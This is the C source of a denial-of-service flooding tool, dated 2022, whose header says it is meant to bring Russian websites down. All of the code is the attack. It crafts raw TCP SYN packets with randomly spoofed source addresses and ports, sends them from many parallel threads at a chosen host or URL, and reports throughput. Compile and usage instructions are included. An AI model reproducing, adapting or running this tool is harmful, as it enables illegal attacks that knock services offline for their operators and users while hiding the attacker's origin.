/*
 * 	DDoS tool with IP spoofing and parallel connections
 * 	to bring russian orc websites to their knees
 *
 * 	by ishiki, 2022
 *
 * 	compile command: gcc main.c -O2 -o bombard -lpthread
 */

#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// payload buffer length
#define PAYLOAD_LEN 2048
// default payload
#define DEF_PAYLOAD "GET / HTTP/1.1\r\n\r\n"
// get a random byte
#define RANDB (rand() & 0xFF)
// get a random word
#define RANDW (rand() & 0xFFFF)


// pseudo header needed for checksum calculation
struct ippsd
{
	uint32_t ippsd_src_addr;
	uint32_t ippsd_dst_addr;
	uint8_t ippsd_plhdr;
	uint8_t ippsd_proto;
	uint16_t ippsd_tcp_len;
};

// TCP packet
struct tcp_pkt
{
	struct iphdr tp_iphdr;
	struct tcphdr tp_tcphdr;
	char tp_payload[PAYLOAD_LEN];
};

// pseudo TCP packet
struct psd_tcp_pkt
{
	struct ippsd ptp_ippsd;
	struct tcphdr ptp_tcphdr;
	char ptp_payload[PAYLOAD_LEN];
};

// connection configuration
struct conn_conf
{
	struct tcp_pkt cc_tcp_pkt;
	int cc_sock;
	struct sockaddr_in cc_sin;
};

char *dst_addr; 		// destination address
uint16_t dst_port = 80; 	// destination port
char *payload = NULL; 		// packet payload
size_t ncon = 1; 		// number of connections
size_t npac = 0; 		// number of packets (0 = inf)
time_t dur = 0; 		// attack duration in seconds (0 = inf)
time_t sttime; 			// attack start time

static atomic_size_t nsent = 0; // total number of packets sent

// generate a random IP address
static in_addr_t rand_addr()
{
	char buff[32] = {0};
	sprintf(buff, "%d.%d.%d.%d", RANDB, RANDB, RANDB, RANDB);
	return inet_addr(buff);
}

// get IP address by host name
static int get_addr(const char *host, char *buff)
{
	struct hostent *he;
	struct in_addr **addr_list;

	if ((he = gethostbyname(host)) == NULL)
		return -1;

	addr_list = (struct in_addr **)he->h_addr_list;

	// return first non-NULL address
	size_t i;
	for (i = 0; addr_list[i] == NULL; ++i) {
	}

	strcpy(buff, inet_ntoa(*addr_list[i]));
	return 0;
}

// check if str1 starts with str2
static uint8_t starts_with(char *str1, char *str2)
{
	size_t trim = strlen(str2);
	char tmp = str1[trim];
	str1[trim] = '\0';
	int res = strcmp(str1, str2);
	str1[trim] = tmp;

	return res == 0;
}

// calculate checksum for a given data array
static uint16_t chksum(uint16_t *data, size_t len)
{
	uint16_t sum = 0;

	for (size_t i = 0; i < len; i+=2)
		sum += data[i];

	if (len & 1)
		sum += *(u_char *)&data[len - 1];

	sum = (sum >> 16) + (sum & 0xFFFF);
	return ~(sum + (sum >> 16));
}

// initialize a TCP connection with spoofed IP
static int init_conn(struct conn_conf *con, in_addr_t dst_addr, 
		in_port_t dst_port, const char *pl)
{
	// shortcuts to struct elements
	int *sock = &con->cc_sock;
	struct sockaddr_in *sin = &con->cc_sin;
	struct iphdr *iph = &con->cc_tcp_pkt.tp_iphdr;
	struct tcphdr *tcph = &con->cc_tcp_pkt.tp_tcphdr;
	char *payload = con->cc_tcp_pkt.tp_payload;

	// create raw socket
	if ((*sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
		perror("socket");
		return -1;
	}

	// copy payload
	strcpy(con->cc_tcp_pkt.tp_payload, pl);

	// socket
	sin->sin_family = AF_INET;
	sin->sin_port = htons(dst_port);
	sin->sin_addr.s_addr = rand_addr();

	// IP header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = sin->sin_addr.s_addr;
	iph->daddr = dst_addr;
	iph->check = chksum((uint16_t *)iph, iph->tot_len);

	// TCP header
	tcph->source = htons(RANDW);
	tcph->dest = htons(dst_port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	// pseudo IP header
	struct ippsd ipps;
	ipps.ippsd_src_addr = iph->saddr;
	ipps.ippsd_dst_addr = iph->daddr;
	ipps.ippsd_plhdr = 0;
	ipps.ippsd_proto = IPPROTO_TCP;
	ipps.ippsd_tcp_len = htons(sizeof(struct tcphdr));

	// pseudo TCP packet
	struct psd_tcp_pkt ppkt = {
		.ptp_ippsd = ipps,
		.ptp_tcphdr = *tcph,
	};
	strcpy(ppkt.ptp_payload, payload);
	size_t len = sizeof(struct psd_tcp_pkt) - (PAYLOAD_LEN - strlen(pl));

	// TCP packet checksum
	tcph->check = chksum((uint16_t *)&ppkt, len);

	int one = 1;
	if (setsockopt(*sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
		perror("setsockopt");
		return -1;
	}

	return 0;
}

// spoof TCP packet by changing source IP, source port and header checksums
static void spoof_pkt(struct conn_conf *con)
{
	struct tcp_pkt *tcpp = &con->cc_tcp_pkt;
	con->cc_sin.sin_addr.s_addr = rand_addr();
	tcpp->tp_iphdr.saddr = con->cc_sin.sin_addr.s_addr;
	tcpp->tp_iphdr.check = 0;
	tcpp->tp_iphdr.check = chksum((uint16_t *)&tcpp->tp_iphdr, 
			tcpp->tp_iphdr.tot_len);
	con->cc_tcp_pkt.tp_tcphdr.source = htons(RANDW);

	// pseudo IP header
	struct ippsd ipps;
	ipps.ippsd_src_addr = con->cc_sin.sin_addr.s_addr;
	ipps.ippsd_dst_addr = con->cc_tcp_pkt.tp_iphdr.daddr;
	ipps.ippsd_plhdr = 0;
	ipps.ippsd_proto = IPPROTO_TCP;
	ipps.ippsd_tcp_len = htons(sizeof(struct tcphdr));

	// pseudo TCP packet
	struct psd_tcp_pkt ppkt = {
		.ptp_ippsd = ipps,
		.ptp_tcphdr = con->cc_tcp_pkt.tp_tcphdr
	};
	strcpy(ppkt.ptp_payload, tcpp->tp_payload);
	size_t len = sizeof(struct psd_tcp_pkt) - 
		(PAYLOAD_LEN - strlen(ppkt.ptp_payload));
	
	// TCP packet checksum
	tcpp->tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
}

// send packet to its destination
static int snd_pkt(const struct conn_conf *con)
{
	int res = sendto(con->cc_sock, (void *)&con->cc_tcp_pkt, 
		con->cc_tcp_pkt.tp_iphdr.tot_len, 0, 
		(struct sockaddr *)&con->cc_sin, sizeof(struct sockaddr_in));
	nsent += (res >= 0);

	return res;
}

// bombardier thread
void *pthread_conn(void *args)
{
	// initialize connection
	struct conn_conf con;
	init_conn(&con, inet_addr(dst_addr), dst_port, payload);

	// bombard loop
	while (1) {
		switch (npac)
		{
		case 0: break;
		default:
			if (nsent >= npac)
				return NULL;
			break;
		}

		spoof_pkt(&con);
		if (snd_pkt(&con) < 0) {
			perror("snd_pkt");
			break;
		}
	}

	return NULL;
}

// SIGINT handler
void int_handler(int sig)
{
	printf("\n%lu packets sent in total\n", nsent);
	exit(EXIT_SUCCESS);
}

static void print_help()
{
 	puts("DDoS tool with IP spoofing and parallel connections");
 	puts("to bring russian orc websites to their knees\n");
 	puts("\tby ishiki, 2022\n");
 	puts("usage: sudo ./bombard <options>");
 	puts("\t-a <address>\t: destination IP address");
 	puts("\t-u <host url>\t: destination URL");
 	puts("\t-p <port>\t: destination port number");
 	puts("\t-l <payload>\t: data payload to send");
 	puts("\t-c <num>\t: number of connections");
 	puts("\t-d <num>\t: duration of attack (in seconds)");
 	puts("\t-n <num>\t: number of packets to send");
 	puts("\t-h\t\t: print help message");
}

int main(int argc, char **argv)
{
	// initialize components
	srand(time(0));
	signal(SIGINT, int_handler);

	int ok = 0;
	int d = 0;
	sttime = time(NULL);

	// parse arguments
	for (int i = 1; i < argc; ++i) {
		if (argv[i][0] != '-')
			continue;

		switch (argv[i][1])
		{
		case 'a': 	// address
			ok = 1;
			dst_addr = argv[++i];
			break;
		case 'u': 	// url
		{
			ok = 1;
			d = 1;
			char *hostname = argv[++i];

			if (starts_with(hostname, "http://")) {
				dst_port = 80;
				hostname += 7; 	// trim "http://"
			} else if (starts_with(hostname, "https://")) {
				dst_port = 443;
				hostname += 8; 	// trim "https://"
			}

			size_t namelen = strlen(hostname);
			if (hostname[namelen - 1] == '/')
				hostname[namelen - 1] = '\0'; // trim slash

			dst_addr = malloc(NI_MAXHOST);
			if (get_addr(hostname, dst_addr) < 0) {
				fputs("unable to resolve host\n", stderr);
				return EXIT_FAILURE;
			}

			break;
		}
		case 'p': 	// port
			dst_port = atoi(argv[++i]);
			break;
		case 'l': 	//payload
			payload = argv[++i];
			break;
		case 'c': 	//number of connections 
			ncon = atoi(argv[++i]);
			break;
		case 'd': 	// duration
			dur = atoi(argv[++i]) - 1;
			break;
		case 'n': 	//number of packets
			npac = atoi(argv[++i]);
			break;
		case 'h': 	// help
			print_help();
			return EXIT_SUCCESS;
		default:
			fputs("invalid flag\n", stderr);
			return EXIT_FAILURE;
		}
	}

	if (!ok) {
		fputs("destination IP address or host URL required\n", stderr);
		return EXIT_FAILURE;
	}

	if (!payload)
		payload = DEF_PAYLOAD;

	printf("initializing attack on %s:%u with %lu connection(s)...\n",
			dst_addr, dst_port, ncon);

	// create threads
	pthread_t *threads = malloc(ncon * sizeof(pthread_t));
	for (size_t i = 0; i < ncon; ++i)
		pthread_create(&threads[i], NULL, pthread_conn, NULL);

	sleep(1); 		// avoid divisons by zero
	puts("\n\n\n\n\n\n"); 	// space buffer for data
	
	size_t pktlen = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(payload));
	while (1) {
		time_t t = time(NULL);
		time_t tdiff = time(NULL) - sttime;
		uint8_t s = tdiff % 60;
		uint8_t m = (tdiff / 60) % 60;
		uint8_t h = tdiff / 3600;
		size_t pps = nsent / tdiff;
		size_t kibps = (pps * pktlen) / 1024;

		puts("\033[6A\rattack statistics:");
		printf("time elapsed:\t\t%02u:%02u:%02u\n", h, m, s);
		printf("total packets sent:\t%lu\n", nsent);
		printf("throughput (packets):\t%lu packets/sec       \n", pps);
		printf("throughput (data):\t%lu KiB/sec          \n\n", kibps);

		// wait for the next second
		while (t == time(NULL))
			usleep(1000);

		if (dur != 0 && tdiff >= dur)
			break;
	}

	// free resources and exit
	for (size_t i = 0; i < ncon; ++i)
		pthread_kill(threads[i], 0);
	free(threads);
	if (d)
		free(dst_addr);
	int_handler(0);
	return EXIT_SUCCESS;
}

